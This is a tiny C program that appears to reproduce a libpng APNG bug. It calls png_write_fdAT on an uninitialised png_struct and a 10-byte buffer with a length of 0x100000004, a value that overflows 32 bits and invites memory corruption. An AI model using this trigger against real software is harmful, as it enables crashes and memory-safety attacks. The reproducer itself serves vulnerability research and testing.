#include <stdio.h>
#include "png.h"
int main() {
    png_struct png;
    png_struct *png_ptr = &png;
    png_byte data[10];
    png_size_t length = (png_size_t)0x100000004ULL;
    png_ptr->next_seq_num = 0;
    png_write_fdAT(png_ptr, data, length);
    return 0;
}
